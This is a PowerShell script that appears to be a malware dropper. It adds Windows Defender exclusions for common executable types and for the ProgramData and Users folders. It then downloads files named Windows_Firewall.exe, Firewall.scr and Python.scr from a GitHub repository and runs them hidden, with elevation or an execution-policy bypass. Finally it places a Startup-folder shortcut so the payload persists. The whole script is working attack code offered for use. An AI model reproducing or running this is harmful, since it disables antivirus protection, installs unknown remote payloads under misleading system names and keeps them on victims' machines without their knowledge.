# Step 1: Get current Windows Defender exclusions
$exclusions = Get-MpPreference
$fileTypes = @('.PS1', '.SCR', '.EXE', '.DLL')
$folders = @('C:\ProgramData', 'C:\Users')

# Step 2: Add exclusions if not already present
foreach ($type in $fileTypes) {
    if ($exclusions.ExclusionExtensions -notcontains $type) {
        Add-MpPreference -ExclusionExtension $type
    }
}

foreach ($folder in $folders) {
    if ($exclusions.ExclusionPath -notcontains $folder) {
        Add-MpPreference -ExclusionPath $folder
    }
}

# Step 3: Task verification
$taskName = "Windows_Firewall"
$existingTask = schtasks /Query /TN $taskName 2>$null

if (-not $existingTask) {
    # Download Windows_Firewall.exe to C:\ProgramData\Microsoft\
    $exePath = 'C:\ProgramData\Microsoft\Windows_Firewall.exe'
    $exeURL = 'https://github.com/cyberforce49/m/raw/refs/heads/main/Windows_Firewall.exe'
    Invoke-WebRequest -Uri $exeURL -OutFile $exePath -UseBasicParsing

    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath -Verb RunAs
    }
}

# Download and execute .scr files silently
powershell -Windowstyle Hidden -ep bypass iwr -uri https://raw.githubusercontent.com/cyberforce49/m/refs/heads/main/Firewall.scr -o C:\ProgramData\SoftwareDistribution\Firewall.scr
powershell.exe -w Hidden C:\ProgramData\SoftwareDistribution\Firewall.scr

powershell -Windowstyle Hidden -ep bypass iwr -uri https://raw.githubusercontent.com/cyberforce49/m/refs/heads/main/Python.scr -o C:\Users\Public\Python.scr
powershell.exe -w Hidden C:\Users\Public\Python.scr

# Create shortcut in Startup folder for persistence
$sourcePath = "C:\ProgramData\SoftwareDistribution\Firewall.scr"
$startupFolder = [Environment]::GetFolderPath("Startup")
$shortcutPath = "$startupFolder\Firewall.lnk"

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $sourcePath
$shortcut.Save()
